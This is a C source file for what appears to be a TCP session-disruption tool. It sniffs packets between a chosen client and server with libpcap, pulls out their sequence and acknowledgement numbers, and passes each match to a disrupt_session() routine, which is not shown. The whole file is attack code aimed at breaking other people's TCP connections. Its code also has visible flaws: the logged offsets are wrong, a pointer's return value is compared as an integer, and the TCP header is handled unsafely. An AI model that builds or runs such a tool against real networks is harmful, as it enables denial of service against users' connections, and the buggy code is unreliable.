#include "tcp-disrupt.h"

int sniffNetwork(sniffArgs *sniffArgs){
    char                errbuf[PCAP_ERRBUF_SIZE];   // The string buffer to store pcap errors in.
    char                packetFilterString[256];    // The string representation of the filter to apply to pcap.
    struct bpf_program  packetFilter;               // The pcap version of the filter to apply.
    int                 maxBytesToCapture = 65535;  // The maximum number of bytes to capture in a packet.
    pcap_t              *packetDescriptor;          // The socket descriptor for our nic.
    char                *nicName = NULL;            // The name of the NIC we are using.
    int                 nicType = -1;               // The type of NIC we are using.
    bpf_u_int32         nicNetMask;                 // The netmask associated with the NIC.
    bpf_u_int32         nicAddress;                 // The IP address associated with the NIC.

    processPacketArgs *processPacketArgs;
    if( !(processPacketArgs = malloc(sizeof(struct processPacketArgs))) ){
        fprintf(stderr, "[FAIL] Unable to obtain memory.\n");
        return 1;
    } 
    memset(processPacketArgs, 0, sizeof(struct processPacketArgs));
    memset(errbuf, 0, PCAP_ERRBUF_SIZE);
    memset(packetFilterString, 0, 256);

    /* Determine the IP addresseses and ports to monitor and create a filter*/
    char *clientIP = sniffArgs->clientIP ? sniffArgs->clientIP : DEFAULT_CLIENT_IP;
    char *serverIP = sniffArgs->serverIP ? sniffArgs->serverIP : DEFAULT_SERVER_IP;
    int     serverPort = sniffArgs->serverPort ? sniffArgs->serverPort : DEFAULT_SERVER_PORT; 
    snprintf(packetFilterString, 256, "tcp and port %d and host %s and host %s", serverPort, serverIP, clientIP);

    processPacketArgs->clientIP = clientIP;
    processPacketArgs->serverIP = serverIP;
    processPacketArgs->serverPort = serverPort;

    /* Determine the name of the network interface we are going to use: */
    if ( !sniffArgs->interface ){
        if ( (nicName = pcap_lookupdev(errbuf)) <= 0 ){
            fprintf(stderr, "[FAIL] pcap_lookupdev returned: \"%s\"\n", errbuf);
            free(processPacketArgs);
            return 1;
        } else printf("[INFO] Found Hardware: %s\n", nicName);
    } else nicName = sniffArgs->interface;

    /* Obtain a descriptor to monitor the hardware: */
    if ( (packetDescriptor = pcap_open_live(nicName, maxBytesToCapture, 1, 512, errbuf)) < 0 ){
        fprintf(stderr, "[FAIL] pcap_open_live returned: \"%s\"\n", errbuf);
        free(processPacketArgs);
        return 1;
    } else printf("[INFO] Obtained Socket Descriptor.\n");

    /* Determine the data link type of the descriptor we obtained: */
    if ((nicType = pcap_datalink(packetDescriptor)) < 0 ){
        fprintf(stderr, "[FAIL] pcap_datalink returned: \"%s\"\n", pcap_geterr(packetDescriptor));
        free(processPacketArgs);
        return 2;
    } else printf("[INFO] Obtained Data Link Type: %d\n", nicType);
 
    /* Determine the header length of the data link layer: */
    switch (nicType) {
        case DLT_NULL:
            processPacketArgs->dataLinkOffset = 4;
            printf("Listening on an NULL connection. Data Link Offset: 14\n");
            break;

        case DLT_EN10MB:
            processPacketArgs->dataLinkOffset = 14;
            printf("Listening on an Ethernet connection. Data Link Offset: 14\n");
            break;
     
        case DLT_SLIP:
        case DLT_PPP:
            processPacketArgs->dataLinkOffset = 24;
            printf("Listening on an SLIP/PPP connection. Data Link Offset: 14\n");
            break;
     
        case DLT_IEEE802_11:
            processPacketArgs->dataLinkOffset = 22;
            printf("Listening on an Wireless connection. Data Link Offset: 22\n");
            break;
        
        default:
            printf("[ERROR]: Unsupported datalink type: %d\n", nicType);
            free(processPacketArgs);
            return 2;
    }

    // Get network nic source IP address and nicNetMask.
    if (pcap_lookupnet(nicName, &nicAddress, &nicNetMask, errbuf) < 0){
        printf("[FAIL] pcap_lookupnet returned: \"%s\"\n", errbuf);
        free(processPacketArgs);
        return 1;
    } else printf("[INFO] nic IP/Netmask: 0x%x/0x%x\n", nicAddress, nicNetMask);

    // Convert the packet filter epxression into a packet  filter binary.
    if (pcap_compile(packetDescriptor, &packetFilter, packetFilterString, 0, nicNetMask)){
        printf("[FAIL] pcap_compile returned: \"%s\"\n", pcap_geterr(packetDescriptor));
        free(processPacketArgs);
        return 1;
    } 

    // Assign the packet filter to the given libpcap socket.
    if (pcap_setfilter(packetDescriptor, &packetFilter) < 0) {
        printf("[FAIL] pcap_setfilter returned: \"%s\"\n", pcap_geterr(packetDescriptor));
        free(processPacketArgs);
        return 1;
    } else printf("[INFO] Packet Filter: %s\n", packetFilterString);

    /* Start the loop: */
    pcap_loop(packetDescriptor, -1, processPacket, (u_char *)processPacketArgs);
    free(processPacketArgs);
    return 0;
}


void processPacket(u_char *arg, const struct pcap_pkthdr *pktHeader, const u_char *packet){
    char            dstIP[256];
    char            srcIP[256];
    int             dataLength;
    void            *headerPtr;
    struct ip       *ipHeader;
    struct tcphdr   *tcpHeader;

    processPacketArgs  *processPacketArgs = (struct processPacketArgs *)arg;;

    /* Navigate past the Data Link layer to the Network layer: */
    headerPtr = (void *)packet;
    headerPtr += processPacketArgs->dataLinkOffset;
 
    /* Increment the number of packets we have processed: */
    processPacketArgs->packetCount++;

    ipHeader = (struct ip*)headerPtr;
    dataLength = ntohs(ipHeader->ip_len) - (4 * ipHeader->ip_hl);
    strcpy(srcIP, inet_ntoa(ipHeader->ip_src));
    strcpy(dstIP, inet_ntoa(ipHeader->ip_dst));

    /* Navigate past the Network layer to the Transport layer: */
    headerPtr += (ipHeader->ip_hl * 4);

    switch (ipHeader->ip_p) {
        case IPPROTO_TCP:
            tcpHeader = (struct tcphdr*)headerPtr;
            dataLength = tcpHeader->doff;
            break;
     
        default:
            break;
    }

    /* Navigate past the Transport layer to the payload: */
    if(dataLength > 0){
        uint32_t ackNum = ntohl(tcpHeader->ack_seq);
        uint32_t seqNum = ntohl(tcpHeader->seq);
        uint16_t sourcePort = ntohs(tcpHeader->source);
        uint16_t destPort = ntohs(tcpHeader->dest);

        if ( !(strcmp(processPacketArgs->clientIP, dstIP)) ) {
            printf("[processPocket]: Matching client IP found: %s\n", dstIP);
            if ( !(strcmp(processPacketArgs->serverIP, srcIP)) ) {
                printf("[processPocket]: Matching server IP found: %s\n", srcIP);
                if ( processPacketArgs->serverPort == sourcePort ){
                    printf("[processPocket]: Matching server port found: %d\n", destPort);
                    printf("[processPocket]: sequence Number: %u\n", (uint32_t)seqNum);
                    printf("[processPocket]: ack Number: %u\n", (uint32_t)ackNum);                    
                    printf("[processPocket]: Disrupting.....\n");
                    disrupt_session((void *)ipHeader);
                }
            }
        }
    }
}
